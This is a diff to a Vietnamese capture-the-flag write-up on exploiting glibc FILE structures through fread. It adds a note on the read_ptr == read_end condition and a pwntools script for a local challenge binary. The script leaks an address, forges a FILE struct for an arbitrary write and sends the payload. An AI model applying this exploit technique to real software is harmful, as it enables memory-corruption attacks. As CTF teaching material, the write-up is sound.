@@ -133,6 +133,8 @@ Ta sẽ set size = 10, lớn hơn size trong `fread(buf,1,8,fp)` là 8 để có
 
 Các fields còn lại sẽ bị set về NULL
 
+Còn điều kiện `read_ptr == read_end` nữa thì vì cả hai bằng NULL nên đáp ứng
+
 <img width="807" height="594" alt="image" src="https://github.com/user-attachments/assets/57af73bb-70c0-4be2-8dec-953045a1758c" />
 
 Theo nguyên lý ban đầu, thì bây giờ `fread()` sẽ đọc data từ FILE vào vùng nhớ `aura`
@@ -153,6 +155,41 @@ Vậy nên mặc dù gọi đến `fread(buf,1,8,fp)`, đáng lẽ lấy luồng
 
 `script.py`:
 ```python
+from pwn import *
+
+context.arch = 'amd64'
+context.binary = exe = ELF("./chall", checksec=False)
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		br mainc
+		br *main + 149
+
+		''')
+
+p = process(exe.path)
+GDB()
+
+### EXPLOIT ###
+
+# lay phan data leak
+p.recvuntil(b"aura: ")
+aura_addr = int(p.recvline()[:-1], 16)
+
+print(f"aura_addr: {hex(aura_addr)}")
+
+# pwntool cho dung struct FILE
+# ta dung khai thac Arbtrary write vaof dia chi aura da leak tren
+fp = FileStructure()
+payload = fp.read(aura_addr, 10)
+
+print(fp)
+
+p.send(payload)
+
+p.send(b"aaaa")
+
+p.interactive()
 ```
 ___
 reference:
